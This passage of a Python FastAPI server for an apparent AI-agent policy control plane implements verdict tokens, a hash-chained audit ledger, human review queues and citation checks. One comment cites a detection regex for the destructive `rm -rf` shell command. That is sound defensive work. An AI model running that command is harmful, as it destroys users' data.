                    reasons = [f"shacl error: {type(e).__name__}: {str(e)[:200]}"]
        else:
            raise HTTPException(422, f"unsupported kind: {kind!r}")

        # PR4: subject/payload_hash are the only keys (legacy aliases
        # rejected by the pydantic validator with extra="forbid").
        subj, phash = req.subject, req.payload_hash
        # D53b follow-up: frame metadata on the ledger row body so the
        # offline dry-run replay can scope rows to (event, matcher).
        frame_meta = _frame_meta_for_ledger(req.hook_event, req.matcher)
        # D53b follow-up (regex only): write a bounded payload snapshot
        # under a reserved key so the dry-run regex replay can scan the
        # SAME text the runtime regex saw. We only do this for kind=
        # regex because (a) llm_critic and shacl can't be replayed
        # offline anyway, and (b) for regex the runtime ledger body
        # otherwise carries only the verdict envelope - the operator's
        # `\brm -rf\b` pattern would never match `{"verdict":"deny"}`.
        # The snapshot is bounded to 4000 chars (matches the
        # llm_critic prompt slice above) and lives under a reserved
        # `__payload_snapshot__` key so the redactor's projection
        # treats it as opaque payload-data on egress.
        ledger_extra: dict = dict(frame_meta)
        if kind == "regex" and payload_text:
            ledger_extra["__payload_snapshot__"] = payload_text[:4000]
        if verdict_status in ("pass", "review"):
            async with chain_lock:
                result = _issue_token(
                    subj, phash, verdict_status,
                    ledger=ledger, keystore=ks, kid=kid, step=step_label,
                    tenant_id=tenant_id,
                    ledger_extra=ledger_extra or None,
                )
            result["reasons"] = reasons
            return result
        async with chain_lock:
            ledger.append(subject=subj,
                          body={**ledger_extra,
                                "step": step_label, "verdict": "deny",
                                "subject": subj, "payload_hash": phash,
                                "reasons": reasons},
                          token="", tenant_id=tenant_id)
        return {"verdict": "deny", "token": None, "reasons": reasons}

    @app.post("/citation_verify", dependencies=[Depends(require_tenant_auth)])
    async def citation_verify(req: VerifyReq, request: Request) -> dict:
        tenant_id = getattr(request.state, "tenant_id", "default")
        # corpus_override total size cap (defense in depth on top of body limit)
        if req.corpus_override:
            total = sum(len(k) + len(v) for k, v in req.corpus_override.items())
            if total > MAX_CORPUS_OVERRIDE_BYTES:
                raise HTTPException(413, "corpus_override too large")
        resolver = DictResolver(req.corpus_override or {})
        doc = verify_document(
            [Citation(c.quote, c.ref) for c in req.citations], resolver,
        )
        # PR4: subject + payload_hash are the canonical (only) keys.
        subj, phash = req.subject, req.payload_hash
        # payload_hash binding: if a document is supplied, payload_hash MUST
        # match its sha256. If only payload_hash is supplied (no document),
        # it is used as the binding — gate callers can opt in to content-
        # binding by passing the document.
        if req.document:
            content_hash = hashlib.sha256(req.document.encode("utf-8")).hexdigest()[:32]
            if phash != content_hash:
                raise HTTPException(
                    400,
                    "payload_hash must equal sha256(document)[:32] when "
                    "document is supplied",
                )
        if doc.verdict == "pass":
            async with chain_lock:
                return _issue_token(subj, phash, "pass",
                                     ledger=ledger, keystore=ks, kid=kid,
                                     tenant_id=tenant_id)
        if doc.verdict == "review":
            # Score `review` citations with NLI advisory so HITL reviewers see
            # entailment/contradiction signals. Pure advisory — does not change
            # the deterministic verdict.
            review_payload = _citations_summary(doc)
            if nli_classifier is not None:
                scored = score_review_citations(doc, source_resolver=resolver,
                                                  classifier=nli_classifier)
                # Splice nli_* fields into the citation summary in-place by index
                for i, s in enumerate(scored):
                    if s.nli_label is not None:
                        review_payload[i]["nli_label"] = s.nli_label
                        review_payload[i]["nli_score"] = s.nli_score
            # PR4: HitlRepo.enqueue now takes ONLY subject + payload_hash;
            # legacy matter/doc_id columns dropped in the PR4 schema
            # migration.
            item = hitl.enqueue(
                subject=subj, payload_hash=phash,
                reason="citation_review",
                payload={"citations": review_payload},
                tenant_id=tenant_id,
            )
            async with chain_lock:
                ledger.append(subject=subj,
                              body={"step": "citation_verify", "verdict": "review",
                                    "subject": subj, "payload_hash": phash,
                                    "hitl_id": item.id},
                              token="", tenant_id=tenant_id)
            return {"verdict": "review", "token": None, "hitl_id": item.id,
                    "citations": _citations_summary(doc)}
        # deny
        async with chain_lock:
            ledger.append(subject=subj,
                          body={"step": "citation_verify", "verdict": "deny",
                                "subject": subj, "payload_hash": phash},
                          token="", tenant_id=tenant_id)
        return {"verdict": "deny", "token": None,
                "citations": _citations_summary(doc)}

    @app.get("/hitl/{item_id}/detail", dependencies=[Depends(require_hitl_key)])
    def get_hitl_detail(item_id: int) -> dict:
        item = hitl.get(item_id)
        if item is None:
            raise HTTPException(404, f"hitl item {item_id} not found")
        # PR4: legacy matter/doc_id columns dropped; subject + payload_hash
        # are the only keys. (Pre-PR4 rows were backfilled by
        # `scripts/migrate_pr3_backfill.py`; the PR4 schema migration
        # refuses to drop the legacy columns until that backfill is
        # complete, so we never observe NULL subject here.)
        subj = item.subject
        phash = item.payload_hash
        # Pull ledger entries for this subject so reviewers see context (the
        # citation_verify=review entry + neighbors). Body redacted by default
        # for general /ledger; here we include because the reviewer is gated.
        ctx_entries = []
        if subj is not None:
            for e in ledger.list_by_subject(subj):
                ctx_entries.append({
                    "id": e.id, "ts": e.ts, "h": e.h, "prev": e.prev,
                    "body": e.body,
                })
        return {
            "id": item.id,
            "subject": subj, "payload_hash": phash,
            "reason": item.reason, "payload": item.payload,
            "status": item.status.value,
            "approver": item.approver, "note": item.note,
            "ts_created": item.ts_created, "ts_decided": item.ts_decided,
            "ledger_context": ctx_entries,
        }

    @app.get("/hitl", dependencies=[Depends(require_hitl_key)])
    def list_hitl() -> dict:
        # PR4: canonical fields only. See get_hitl_detail above.
        return {"items": [
            {"id": i.id,
             "subject": i.subject, "payload_hash": i.payload_hash,
             "reason": i.reason, "payload": i.payload,
             "ts_created": i.ts_created}
            for i in hitl.list_pending()
        ]}

    @app.post("/hitl/{item_id}/approve", dependencies=[Depends(require_hitl_key)])
    async def hitl_approve(item_id: int, body: DecideReq) -> dict:
        item = hitl.get(item_id)
        if item is None:
            raise HTTPException(404, f"hitl item {item_id} not found")
        try:
            hitl.approve(item_id, approver=body.approver, note=body.note)
        except ValueError as e:
            raise HTTPException(409, str(e))
        subj = item.subject
        phash = item.payload_hash
        if subj is None or phash is None:
            # Should be unreachable post-PR4: schema migration refuses to
            # run if any row has NULL subject/payload_hash (would lose data).
            raise HTTPException(500, f"hitl item {item_id} missing key fields")
        async with chain_lock:
            return _issue_token(subj, phash, "pass",
                                ledger=ledger, keystore=ks, kid=kid,
                                extra={"hitl_id": item_id, "approver": body.approver})

    @app.post("/hitl/{item_id}/reject", dependencies=[Depends(require_hitl_key)])
    async def hitl_reject(item_id: int, body: DecideReq) -> dict:
        item = hitl.get(item_id)
        if item is None:
            raise HTTPException(404, f"hitl item {item_id} not found")
        try:
            hitl.reject(item_id, approver=body.approver, note=body.note)
        except ValueError as e:
            raise HTTPException(409, str(e))
        subj = item.subject
        phash = item.payload_hash
        async with chain_lock:
            ledger.append(subject=subj or "",
                          body={"step": "hitl_decision", "decision": "rejected",
                                "subject": subj,
                                "payload_hash": phash,
                                "hitl_id": item_id,
                                "approver": body.approver},
                          token="")
        return {"verdict": "rejected", "token": None, "hitl_id": item_id}

    # D52c follow-up: cap the repeatable `verifier=` parameter so an
    # authenticated caller cannot amplify a request into an unbounded
    # `IN (...)` clause. 64 covers any realistic catalog size (the
    # built-ins are 5; a tenant's custom-verifier table is bounded
    # by `/verifiers/new` form input).
    _LEDGER_VERIFIER_LIMIT = 64

    def _normalize_verifier_param(values: list[str] | None) -> list[str]:
        wanted = [v for v in (values or []) if v]
        if len(wanted) > _LEDGER_VERIFIER_LIMIT:
            raise HTTPException(
                400,
                f"verifier= accepts at most {_LEDGER_VERIFIER_LIMIT} values; "
                f"got {len(wanted)}",
            )
        return wanted

    @app.get("/ledger", dependencies=[Depends(require_tenant_auth)])
    def list_ledger(request: Request, since_id: int = 0, limit: int = 100,
                     include_body: bool = False,
                     verifier: list[str] | None = Query(default=None)) -> dict:
        """Per-tenant ledger view. chain_ok validates the GLOBAL chain (so
        cross-tenant tampering is still detectable), but `entries` is scoped
        to the requesting tenant.

        D52c: `verifier=<step>` (repeatable) filters entries to those whose
        `body['step']` matches one of the supplied names. The filter is
        applied AFTER tenant scoping and BEFORE pagination so the
        `next_since_id` cursor advances over the filtered view (callers
        paginating by verifier do not have to scan thousands of unrelated
        entries to find the next page).

        D52c follow-up:
          - `since_id` + `verifier` + `limit` are pushed into SQL via
            `list_by_tenant_page` so the database does the skipping
            (was: full-tenant Python scan per request, O(N_tenant)).
          - `chain_ok` is skipped when paginating (`since_id > 0`); a
            caller fetching page 2+ is not auditing the chain, and the
            cost of re-verifying scales with the whole chain not the
            page. Dedicated `/ledger/integrity` endpoint surfaces the
            chain-ok bit on demand. Page 1 still verifies on every
            call (matches the prior shape: the dashboard polls page
            1 and expects the badge).
          - `verifier` count is capped (HTTPException 400 above the
            limit) to bound the SQL `IN (...)` clause.
        """
        limit = max(1, min(int(limit), 1000))
        tenant_id = getattr(request.state, "tenant_id", "default")
        wanted = _normalize_verifier_param(verifier)
        # Over-fetch one to compute `has_more` so the dashboard can
        # hide the Load more affordance when the filtered chain is
        # exhausted (was: the page only knew it had hit the end via
        # `len(entries) < LEDGER_PAGE_SIZE`, which is fragile when
        # the page size happens to equal the remaining count).
        page = ledger.list_by_tenant_page(
            tenant_id,
            since_id=since_id,
            limit=limit + 1,
            verifier=wanted or None,
        )
        has_more = len(page) > limit
        if has_more:
            page = page[:limit]
        # D52c follow-up: skip the global chain re-walk when the caller
        # is paginating. The chain has not changed by the time the
        # operator clicks Next; page 1 (since_id == 0) still verifies
        # so the dashboard's chain-integrity badge stays accurate.
        chain_ok = ledger.verify_chain() if since_id == 0 else True
        return {"chain_ok": chain_ok,
                "next_since_id": page[-1].id if page else since_id,
                "has_more": has_more,
                "entries": [
                    {"id": e.id, "ts": e.ts,
                     "subject": e.matter,
                     "prev": e.prev, "h": e.h,
                     **({"body": e.body, "token": e.token} if include_body else {})}
                    for e in page
                ]}

    @app.get("/ledger/integrity", dependencies=[Depends(require_tenant_auth)])
    def ledger_integrity() -> dict:
        """D52c follow-up: dedicated chain-integrity endpoint.

        The dashboard can poll this at low frequency for the
        chain-ok badge so paginated `/ledger` reads stay cheap. The
        verify_chain implementation is incremental (LedgerRepo caches
        the last verified head + id) so calls after the first one
        only re-hash the appended suffix.
        """
        return {"chain_ok": ledger.verify_chain()}

    @app.get("/ledger/count", dependencies=[Depends(require_tenant_auth)])
    def ledger_count(request: Request,
                      verifier: list[str] | None = Query(default=None),
                      since_secs: int | None = None) -> dict:
        """D52c: count of ledger entries matching the given filter(s).

        Used by the Rules → Verifiers expander to render a "Recent emissions
        (last 24h)" widget without paging through the entire chain. The
        `verifier=<step>` query is repeatable (multi-select on the
        dashboard); `since_secs=<int>` bounds the window to entries with
        `ts >= now - since_secs` (24h = 86400).

        Returns `{count: N}`. Empty case returns 0, no error for an
        unknown verifier name (the chip selector lists names that exist,
        and a typo'd query should not crash the expander).

        D52c follow-up: pushed into SQL via `LedgerRepo.count_by_tenant`
        (was O(N_tenant_rows) hydrate-and-walk per request)."""
        tenant_id = getattr(request.state, "tenant_id", "default")
        wanted = _normalize_verifier_param(verifier)
        cutoff: int | None = None
        if since_secs is not None and since_secs > 0:
            cutoff = int(time.time()) - int(since_secs)
        n = ledger.count_by_tenant(
            tenant_id, verifier=wanted or None, since_ts=cutoff,
        )
        return {"count": int(n)}

    @app.get("/ledger/samples", dependencies=[Depends(require_tenant_auth)])
    def ledger_samples(request: Request,
                        verifier: str = Query(..., min_length=1, max_length=64,
                                              pattern=_KEY_PATTERN),
                        limit: int = Query(default=5, ge=1, le=25),
                        since_secs: int = Query(default=86400, ge=0)) -> dict:
        """D53a: most-recent N redacted samples for a single verifier.

        Powers the inline "Recent emissions" sample list on the verifier
        catalog expander. Each sample is the verdict + a short redacted
        preview of the body (raw payloads never reach the dashboard;
        every preview flows through `run_redaction.redact_payload_preview`
        before the response is built).

        Defaults:
          - `limit=5` (max 25, lower-clamped to 1)
          - `since_secs=86400` (24h window; `0` disables the window)
          - `verifier` is required; unknown verifier names return
            `{samples: []}` (NOT 404; an empty filter view is a valid
            operator-visible state, mirrors the count endpoint's
            "unknown=0" contract).

        Auth: same tenant-scoped key as /ledger.
        """
        from ..policy.run_redaction import (
            DEFAULT_PREVIEW_MAX_CHARS, redact_payload_preview,
        )
        tenant_id = getattr(request.state, "tenant_id", "default")
        cutoff: int | None = None
        if since_secs > 0:
            cutoff = int(time.time()) - int(since_secs)
        rows = ledger.list_recent_by_verifier(
            tenant_id,
            verifier=verifier,
            limit=limit,
            since_ts=cutoff,
        )
        # Closed-set verdict allowlist. Single source of truth in
        # magi_cp.policy.verdicts; widening the closed set is a
        # one-line change there. Anything outside collapses to None
        # at the cloud boundary so a misbehaving producer cannot leak
        # a novel string through this surface.
        from ..policy.verdicts import LEDGER_VERDICTS
        samples: list[dict] = []
        for r in rows:
            # Intentionally drop r.subject / r.matter / r.digest /
            # r.payload_hash from the response — only id, ts, the
            # redacted body summary, and the closed-set verdict reach
            # the client. The body is the ONLY field that can carry
            # producer-supplied content; everything that flows from
            # body must pass through the redactor (`policy_id` is
            # dropped entirely today — fail-closed projection — until
            # a producer + redaction contract is defined for it).
            body = r.body if isinstance(r.body, dict) else {}
            verdict_raw = body.get("verdict")
            verdict = (
                verdict_raw
                if isinstance(verdict_raw, str)
                and verdict_raw in LEDGER_VERDICTS
                else None
            )
            # Defense in depth: every body MUST pass through the
            # redactor before it reaches the response. The preview
            # function is fail-closed (allowlist projection + linear
            # regex masking) so an unexpected future body field with a
            # secret cannot leak through this surface.
            preview = redact_payload_preview(
                body, max_chars=DEFAULT_PREVIEW_MAX_CHARS,
            )
            samples.append({
                "id": r.id,
                "ts": _iso_ts(r.ts),
                "verdict": verdict,
                "redacted_payload_preview": preview,
                # `policy_id` is intentionally NOT projected. There is
                # no producer that records it today, and no redaction
                # contract for the field is defined; fail-closed
                # projection means the frontend type stays nullable
                # but the wire surface drops it entirely. Re-introduce
                # only after the producer schema + a redact_text pass
                # are wired.
            })
        return {"samples": samples}

    @app.get("/ledger/counts", dependencies=[Depends(require_tenant_auth)])
    def ledger_counts(request: Request,
                       verifier: list[str] | None = Query(default=None),
                       since_secs: int | None = None) -> dict:
        """D52c follow-up: batched per-step count.

        Replaces the dashboard fan-out of one `/ledger/count` call per
        catalog row with a single GROUP BY query. The Rules → Verifiers
        tab calls this once per render, regardless of how many
        verifiers the catalog grows to. Returns `{counts: {step: n}}`
        (every step in the request appears in the response: missing
        keys → 0) so the dashboard can render dashes for "no
        emissions" without a follow-up call.

        Capped at `_LEDGER_VERIFIER_LIMIT` steps per request (same
        bound as `/ledger` and `/ledger/count`).
        """
        tenant_id = getattr(request.state, "tenant_id", "default")
        wanted = _normalize_verifier_param(verifier)
        cutoff: int | None = None
        if since_secs is not None and since_secs > 0:
            cutoff = int(time.time()) - int(since_secs)
        counts = ledger.counts_by_step(
            tenant_id, steps=wanted, since_ts=cutoff,
        )
        return {"counts": counts}

    # ── D76: /ledger/aggregate + /metrics/summary — Overview surface ──
    #
    # The `/overview` dashboard polls a single round-trip summary +
    # one time-bucketed aggregate every 30s. Both routes are
    # tenant-scoped (same auth as /ledger) so the polling cost is
    # bounded by the tenant chain size, not the global one.
    from .metrics import (
        ledger_aggregate as _ledger_aggregate,
        ledger_aggregate_to_dict as _ledger_aggregate_to_dict,
        metrics_summary as _metrics_summary,
        metrics_summary_to_dict as _metrics_summary_to_dict,
    )

    @app.get("/ledger/aggregate", dependencies=[Depends(require_tenant_auth)])
    def ledger_aggregate_route(
        request: Request,
        since_secs: int | None = Query(default=None, ge=1),
        bucket_secs: int | None = Query(default=None, ge=1),
    ) -> dict:
        """D76: time-bucketed counts powering the /overview chart.

        Defaults to a 24h window in 1h buckets (24 buckets). Buckets
        carry `count` + `by_action` (block/ask/audit/inject_context/
        run_command/input_rewrite) + `by_verdict` (pass/fail/
        needs_review/not_applicable). Unknown action/verdict strings
        do NOT increment any bucket but still count toward the
        bucket's `count` total so the chart's stacked columns can be
        compared against the row totals.

        `since_secs` is hard-capped at 30 days; `bucket_secs` is
        clamped to a 60-second floor. A configuration that would
        produce more than `MAX_BUCKETS` buckets returns 400 (cheap
        guard against `?since_secs=2592000&bucket_secs=1`).
        """
        tenant_id = getattr(request.state, "tenant_id", "default")
        try:
            agg = _ledger_aggregate(
                request.app.state.engine, tenant_id,
                since_secs=since_secs, bucket_secs=bucket_secs,
            )
        except ValueError as e:
            raise HTTPException(400, str(e)) from e
        return _ledger_aggregate_to_dict(agg)

    @app.get("/metrics/summary", dependencies=[Depends(require_tenant_auth)])
    def metrics_summary_route(request: Request) -> dict:
        """D76: single-round-trip aggregator for /overview.

        Returns policy/pack/script/HITL/ledger counts in one call so
        the dashboard's headline + KPI grid can render off a single
        request instead of fanning out to six endpoints. Tenant-scoped
        for the ledger + HITL slices; policy/pack/script counts are
        single-tenant on the self-host install (which ships one
        PolicyStore/PackStore/ScriptStore per cloud) so the figures
        match the /rules + /scripts pages 1:1.
        """
        tenant_id = getattr(request.state, "tenant_id", "default")
        # Pack member lists: builtin specs + user-pack rows. We resolve
        # them inline so the metrics module doesn't take a build-time
        # dependency on the pack catalog import (which pulls the
        # policy IR; we want the metrics module to stay test-cheap).
        from ..policy.pack import all_builtin_packs
        pack_member_lists: list[list[str]] = []
        # all_builtin_packs returns dicts with policy_ids; reuse the
        # catalog so we get the same ordering the /policy-packs surface
        # exposes. locale is irrelevant for the count (policy_ids is
        # locale-agnostic) so we pass "en" arbitrarily.
        for p in all_builtin_packs(locale="en", enabled_ids=set()):
            pack_member_lists.append(list(p.get("policy_ids", [])))
        if pack_store is not None:
            for row in pack_store.load():
                pack_member_lists.append(list(row.policy_ids))
        scripts_total = 0
        if script_store is not None:
            try:
                scripts_total = len(script_store.list())
            except Exception:
                # Defense in depth: a malformed scripts index must not
                # take the overview offline. The /scripts page will
                # surface the underlying error if the operator drills in.
                scripts_total = 0
        summary = _metrics_summary(
            request.app.state.engine, tenant_id,
            policy_overrides=policy_store.load(),
            pack_member_lists=pack_member_lists,
            scripts_total=scripts_total,
            ledger_repo=ledger,
        )
        return _metrics_summary_to_dict(summary)

    # ── /policies CRUD (v1) ──────────────────────────────────────
    # ── Codex runtime adapter (P4) - coverage + per-tenant runtime ────
    # Registered BEFORE _attach_policy_routes so the specific
    # `/policies/{id}/coverage/{runtime}` route is matched ahead of that
    # helper's greedy `/policies/{policy_id:path}` catch-all.
    _attach_runtime_routes(app, engine,
                           policy_store=policy_store,
                           pack_store=pack_store)

    _attach_policy_routes(app, policy_store, policy_lock,
                          verifier_registry=verifier_registry,
                          keystore=ks,
                          kid=kid,
                          script_store=script_store,
                          script_store_lock=script_store_lock,
                          pack_store=pack_store,
                          pack_store_lock=pack_store_lock)

    # ── /admin/tenants (v2-W6a) — HMAC-signed; clawy webhook calls these ──
    _attach_admin_tenant_routes(app, engine)

    # ── /catalog/* — derived (read-only) evidence-type + condition view ──
    _attach_catalog_routes(
        app, policy_store, verifier_registry,
        custom_verifier_store=custom_verifier_store,
    )

    # ── /checks + /evidence-types (D56e) — new Rules page tabs ──────────
    _attach_check_evidence_routes(
        app, policy_store, verifier_registry,
        custom_verifier_store=custom_verifier_store,
    )

    # ── /payload-schemas — P7 CC hook payload field menu (read-only) ──
    _attach_payload_schema_routes(app)

    # ── /verifier-descriptors: D52b per-verifier expander descriptors ──
    _attach_verifier_descriptor_routes(app)

    # ── /custom-verifiers: D52b step-only authoring (tenant-scoped) ──
    _attach_custom_verifier_routes(
        app, custom_verifier_store, custom_verifier_lock,
        verifier_registry=verifier_registry,
    )

    # ── /endpoints — P10 endpoint attestation ─────────────────────────
    _attach_endpoint_routes(app, engine, policy_store=policy_store)

    # ── /scripts — D63 run_command policy script storage ────────────
    _attach_script_store_routes(
        app, script_store, script_store_lock,
        policy_store=policy_store,
    )

    # ── /session/{session_id}/packs — P1 pack-centric runtime ─────────
    # Session-scoped activation surface. See
    # docs/plans/2026-06-30-pack-centric-session-scoped-runtime.md.
    # P2 folds the ``/session/{id}/resolved`` gate-cache feeder into
    # the same attach helper so the pack + policy stores share one
    # closure (the resolver reads BOTH to fold pack membership into a
    # (event, matcher) -> policies map for the gate binary cache).
    _attach_session_pack_routes(
        app, engine,
        pack_store=pack_store,
        pack_store_lock=pack_store_lock,
        policy_store=policy_store,
    )

    return app


# ── helpers ──────────────────────────────────────────────────────────
def _frame_meta_for_ledger(
    hook_event: str | None, matcher: str | None,
) -> dict[str, str]:
    """D53b follow-up: project optional frame metadata onto the
    ledger-body subset the offline dry-run replay reads.

    The replay needs `body['hook_event']` and `body['matcher']` to
    scope ledger rows to the proposed policy's (event, matcher)
    frame; without them, the replay would admit every tenant row in
    the window and over-report the matched count. We accept None for
    each field (gates that haven't rolled forward past this contract
    just omit them) and project only the values that are present, so
    a gate that supplies only `hook_event` still gets partial frame
    metadata in its rows.

    Returns an empty dict when both inputs are None. The caller folds
    the result into the ledger body via dict spread; protected ledger
    fields written by the route override on key clash.
    """
    out: dict[str, str] = {}
    if isinstance(hook_event, str) and hook_event:
        out["hook_event"] = hook_event
    if isinstance(matcher, str) and matcher:
        out["matcher"] = matcher
    return out


def _iso_ts(ts: int) -> str:
    """Format a ledger row's epoch-second `ts` as ISO-8601 UTC.

    D53a: the samples endpoint returns ISO strings (the dashboard renders
    them as relative time via the browser). `ts` is stored as an int
    epoch second in `LedgerEntry.ts`; we format with a trailing `Z` so
    the consumer doesn't have to guess at the timezone.
    """
    import datetime as _dt
    return (
        _dt.datetime.fromtimestamp(int(ts), tz=_dt.timezone.utc)
           .strftime("%Y-%m-%dT%H:%M:%SZ")
    )


def _citations_summary(doc) -> list[dict]:
    return [
        {"ref": v.citation.ref, "case_number": v.case_number,
         "status": v.status, "reasons": v.reasons}
        for v in doc.verdicts
    ]


def _issue_token(subject: str, payload_hash: str, verdict: str, *,
                 ledger: LedgerRepo, keystore: KeyStore, kid: str,
                 step: str = "citation_verify",
                 tenant_id: str = "default",
                 extra: dict | None = None,
                 ledger_extra: dict | None = None) -> dict:
    """Issue a cloud-signed verdict token.

    PR4: legacy `matter`/`doc_hash` mirror fields removed from the signed
    body. Gates that haven't rolled forward past PR2 will no longer find
    a verifying token — operators must upgrade gate binaries before
    flipping to a PR4 cloud.

    `extra` is folded into the signed token body (and therefore into
    the ledger row body too). `ledger_extra` is written ONLY to the
    ledger row body and is NOT signed; use it for frame metadata
    (hook_event / matcher) and the runtime payload snapshot the
    offline dry-run replay reads, which the gate has no reason to
    re-verify cryptographically.
    """
    now = int(time.time())
    # L2: extras are *base*; protected fields go LAST so they always win.
    base = dict(extra) if extra else {}
    leaked = PROTECTED_TOKEN_FIELDS & base.keys()
    if leaked:
        raise HTTPException(500, f"protected field clash: {leaked}")
    body = {
        **base,
        "step": step,
        "subject": subject,
        "payload_hash": payload_hash,
        "verdict": verdict,
        "iat": now,
        "exp": now + TOKEN_TTL_SECONDS,
        "issuer": os.environ.get("MAGI_CP_ISSUER", "magi-cloud-dev"),
        "kid": kid,
    }
    token = sign_token(body, keystore.load_private())
    # PR4: `ledger.append` accepts `subject=` as the canonical kwarg. The
    # underlying DB column is still named `matter` until the deeper ledger
    # rename ships — see LedgerRepo.append for that compatibility shim.
    # D53b follow-up: ledger_extra fields land in the ledger row body
    # only (not in the signed token), so frame metadata and the
    # payload snapshot can travel with the row without inflating the
    # token (which gates re-verify cryptographically on every call).
    ledger_body = body
    if ledger_extra:
        # Protected fields still win — the cryptographic identity of
        # the row is anchored on the signed body.
        ledger_body = {**ledger_extra, **body}
    entry = ledger.append(subject=subject, body=ledger_body, token=token,
                           tenant_id=tenant_id)
    return {"verdict": verdict, "token": token, "exp": body["exp"],
            "kid": kid, "ledger_h": entry.h}


def _enforcement_label(policy: AnyPolicy) -> str:
    """Short human label for the enforcement character of a policy.

    Issue #1 P0 (#14): type-dispatch per archetype. The declarative
    archetypes are always `enforcing` (no verifier hop; CC consumes
    them out of managed-settings directly). EvidencePolicy keeps the
    D31 (action, event)-based mapping.
    """
    if isinstance(policy, EvidencePolicy):
        if policy.action in ("block", "ask"):
            return "deterministic-gate"
        if policy.trigger.event == "PostToolUse":
            return "observe-only"
        return "log-only"
    # Declarative archetypes: CC enforces directly via managed-settings.
    return "enforcing"


def _serialize_policy_for_api(p: AnyPolicy) -> dict:
    """Per-archetype response serializer.

    Issue #1 P0 (#14): EvidencePolicy keeps its existing JSON shape
    (sentinel_re / requires / action / ...) for back-compat. The
    P2/P3 sibling types carry their own discriminator + fields so the
    dashboard can render the right form.
    """
    if isinstance(p, EvidencePolicy):
        return {
            "type": "evidence",
            "id": p.id,
            "description": p.description,
            "version": p.version,
            "trigger": {"host": p.trigger.host, "event": p.trigger.event,
                        "matcher": p.trigger.matcher},
            "sentinel_re": p.sentinel_re,
            "requires": [_evidence_req_to_dict(r) for r in p.requires],
            "action": p.action,
            "on_signature_invalid": p.on_signature_invalid,
            "gate_binary": p.gate_binary,
        }
    if isinstance(p, PermissionPolicy):
        return {
            "type": "permission",
            "id": p.id, "description": p.description, "version": p.version,
            "trigger": {"host": p.trigger.host, "event": p.trigger.event,
                        "matcher": p.trigger.matcher},
            "permission": p.permission,
            "pattern": p.pattern,
            "exclusive": p.exclusive,
        }
    if isinstance(p, SubagentPolicy):
        return {
            "type": "subagent",
            "id": p.id, "description": p.description, "version": p.version,
            "subagent_type": p.subagent_type,
            "tool_allowlist": list(p.tool_allowlist),
        }
    if isinstance(p, McpGatingPolicy):
        return {
            "type": "mcp_gating",
            "id": p.id, "description": p.description, "version": p.version,
            "server": p.server, "action": p.action,
            "exclusive": p.exclusive,
        }
    if isinstance(p, ContextInjectionPolicy):
        return {
            "type": "context_injection",
            "id": p.id, "description": p.description, "version": p.version,
            "event": p.event, "matcher": p.matcher, "template": p.template,
        }
    if isinstance(p, InputRewritePolicy):
        return {
            "type": "input_rewrite",
            "id": p.id, "description": p.description, "version": p.version,
            "trigger": {"host": p.trigger.host, "event": p.trigger.event,
                        "matcher": p.trigger.matcher},
            "rewriter": p.rewriter,
        }
    if isinstance(p, RunCommandPolicy):
        return {
            "type": "run_command",
            "id": p.id, "description": p.description, "version": p.version,
            "trigger": {"host": p.trigger.host, "event": p.trigger.event,
                        "matcher": p.trigger.matcher},
            "runtime": p.runtime,
            "command": p.command,
            "script_path": p.script_path,
            "args": list(p.args),
            "timeout_ms": p.timeout_ms,
            "fail_closed": p.fail_closed,
        }
    raise HTTPException(500, f"unserializable policy type: {type(p).__name__}")


def _deserialize_policy_from_api(d: dict) -> AnyPolicy:
    """Discriminated deserializer.

    Issue #1 P0 (#12): route through `policy_from_dict` so PUT
    /policies/{id} can persist any archetype, not just evidence. The
    legacy EvidencePolicy shape is preserved (`type` defaults to
    `evidence`).
    """
    from ..policy.ir import policy_from_dict
    return policy_from_dict(d)


def _compile_with_sha(policy: AnyPolicy) -> tuple[dict, str]:
    """Compile a single policy and return (managed_settings, sha256).

    Non-blocking #a fix: the sha is computed over the same byte string
    `compile_files` writes to disk (json.dumps + trailing newline) so
    the dashboard's `compiled_sha256` matches the gate's
    `active_policy_digest` (which hashes the file bytes verbatim).
    """
    import json as _json
    ms = compile_to_managed_settings([policy])
    blob = _json.dumps(ms, ensure_ascii=False,
                        indent=2, sort_keys=True) + "\n"
    return ms, hashlib.sha256(blob.encode("utf-8")).hexdigest()


def _compile_set_with_sha(policies: list[AnyPolicy]) -> tuple[dict, str]:
    """Same as `_compile_with_sha` but for a whole resolved set — used
    by the dashboard's fleet attestation lookup (Issue #1 P0 #2)."""
    import json as _json
    ms = compile_to_managed_settings(policies)
    blob = _json.dumps(ms, ensure_ascii=False,
                        indent=2, sort_keys=True) + "\n"
    return ms, hashlib.sha256(blob.encode("utf-8")).hexdigest()


# Derive the source regex from SOURCE_PRECEDENCE so the two cannot drift.
from ..policy.precedence import SOURCE_PRECEDENCE as _SP  # noqa: E402  paired-with-regex-below
_SOURCE_REGEX = "^(" + "|".join(_SP) + ")$"


_POLICY_ID_PATTERN = r"^[A-Za-z0-9][A-Za-z0-9._\-/]{0,127}$"


class PolicyIn(BaseModel):
    """Request body for PUT /policies/{id}.

    Issue #1 P0 (#12): the boundary is intentionally loose — `type`
    discriminates and we route through `policy_from_dict` /
    `policy.validate()` for archetype-specific shape checks (each
    archetype's dataclass has fields the others don't). The pydantic
    layer only asserts the universal id shape + the discriminator;
    everything else is checked by Policy.__post_init__ via the
    matrix.

    Pre-P2 clients omit `type` and ship the EvidencePolicy shape —
    `policy_from_dict` defaults `type="evidence"` so the existing
    contract still passes.
    """
    model_config = {"extra": "allow"}

    id: str = Field(..., min_length=1, max_length=128,
                     pattern=_POLICY_ID_PATTERN)
    type: str | None = Field(
        default=None,
        pattern=r"^(evidence|permission|subagent|mcp_gating|context_injection|input_rewrite|run_command)$",
    )


class PutPolicyReq(BaseModel):
    """PUT body. `policy` is loosely-typed at the boundary (see
    PolicyIn) and re-validated archetype-specifically via
    `_deserialize_policy_from_api`."""
    model_config = {"extra": "forbid"}
    policy: dict
    source: str = Field(..., pattern=_SOURCE_REGEX)
    enabled: bool = True
    # P4 (pack-centric authoring): 0..n user-pack ids the saved policy
    # should join. On save the cloud appends the policy id to each named
    # pack's member list in the SAME critical section as the policy
    # write. Empty / omitted = orphan (no pack membership) — a legitimate
    # "author now, wire up later" state. Built-in ``pack/…`` ids are
    # rejected (immutable membership); the floor pack (a ``user-pack/…``
    # row) is accepted so an operator can pin a policy to "always-on".
    pack_ids: list[str] | None = None


class PatchEnabledReq(BaseModel):
    enabled: bool


class InputRewriteReq(BaseModel):
    """D57f-2 — request body for the `magi-cp-input-rewrite` shim's
    POST /policies/input_rewrite call.

    P2 follow-up: per-field length cap on `tool_input` values. The
    middleware body cap (`MAX_REQUEST_BYTES`, 256KB) is the ambient
    ceiling, but a single string field inside `tool_input` can still
